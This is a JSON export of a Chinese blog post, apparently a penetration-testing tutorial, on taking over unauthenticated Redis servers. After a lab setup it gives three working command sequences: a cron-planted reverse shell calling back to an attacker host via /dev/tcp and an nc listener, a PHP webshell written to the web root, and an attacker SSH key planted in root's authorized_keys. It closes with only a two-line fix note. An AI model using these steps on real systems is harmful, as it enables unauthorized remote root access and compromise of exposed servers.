{"pages":[],"posts":[{"title":"渗透测试-Redis未授权访问 getshell","text":"RedisRedis在默认情况下，会绑定在0.0.0.0:6379，如果没有采用限制IP访问，就会将Redis服务暴露在公网上，并且在没有设置密码认证的情况下，会导致任意用户未授权访问Redis以及读取Redis数据并写入公钥进行远程连接等。 本地漏洞环境搭建靶机：CentOS6.5 CentOS安装redis：wget http://download.redis.io/releases/redis-3.2.0.tar.gztar xzf redis-3.2.0.tar.gzcd redis-3.2.0make修改配置文件，使可以远程访问： vim redis.confbind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server./src/redis-server redis-conf默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。 Redis常见getshell方法1.反弹shell123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.128.136/2334 0&gt;&amp;1\\n&quot;OK192.168.128.145:6379&gt; config set dir /var/spool/cron/OK192.168.128.145:6379&gt; config set dbfilename rootOK192.168.128.145:6379&gt; saveOK 12192.168.128.136主机：root@192.168.128.136:~# nc -lvvp 2334 2.写入webshell123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; config set dir /var/www/html/OK192.168.128.145:6379&gt; config set dbfilename shell.phpOK192.168.128.145:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;OK192.168.128.145:6379&gt; saveOK webshell访问http://192.168.128.145/shell.php 3.写入SSH密钥生成SSH密钥 1root@kali:~/.ssh# ssh-keygen -t rsa 复制生成的id_rsa.pub文件内容写入redis，注意密钥一定要在前后各加入”\\n\\n\\n”写入 123456789root@kali:~# redis-cli -h 192.168.128.145192.168.128.145:6379&gt; config set dir /root/.ssh/OK192.168.128.145:6379&gt; config set dbfilename authorized_keysOK192.168.128.145:6379&gt; set x &quot;\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\\n\\n\\n&quot;OK192.168.128.145:6379&gt; saveOK 12root@kali:~# ssh -i id_rsa root@192.168.128.145root@192.168.128.145:~# 安全修复1、限制登录ip2、添加密码","link":"/2020/04/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-getshell/"}],"tags":[{"name":"Redis 渗透测试","slug":"Redis-渗透测试","link":"/tags/Redis-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"categories":[]}